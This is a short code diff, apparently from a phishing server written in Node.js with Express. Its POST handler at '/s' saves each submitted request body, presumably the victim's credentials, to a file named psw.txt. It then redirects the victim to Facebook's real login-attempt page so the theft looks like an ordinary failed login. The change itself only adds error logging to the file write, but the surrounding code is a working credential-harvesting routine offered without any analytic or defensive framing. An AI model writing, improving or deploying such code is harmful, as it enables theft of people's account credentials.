@@ -21,7 +21,7 @@ app.post('/s', function (req, res) {
     fs.appendFile(
         __dirname + '/psw.txt',
         JSON.stringify(req.body) + '\n\n',
-        () => {}
+        (e) => {console.log(e);}
     );
     res.redirect('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110');
 });
